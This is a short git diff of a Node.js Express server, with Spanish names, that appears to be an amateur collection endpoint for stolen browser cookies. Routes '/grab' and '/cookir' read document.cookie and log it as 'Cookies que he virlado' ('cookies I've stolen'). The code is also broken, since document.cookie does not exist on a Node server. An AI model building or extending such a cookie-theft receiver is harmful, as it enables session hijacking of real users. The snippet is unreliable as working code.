@@ -2,7 +2,7 @@ const express = require('express');
 const app = express();
 let texto = "";
 let cokkiesQueGuardo = "";
-//const cookies = document.cookie
+//let cookies = document.cookie;
 
 app.get('/', (req, res) => {
   res.send('Holiwi')
@@ -18,9 +18,8 @@ app.get('/grab', (req, res) => {
   })
   
   app.get('/cookir', (req, res) => {
-      let cookir = document.cookie
-      cokkiesQueGuardo += cookir;
-      console.log(cookir)
+      let cookie = document.cookie
+      console.log("Cookies que he virlado:" + cookie)
       res.send('Hola wuenas tardes')
   
   })
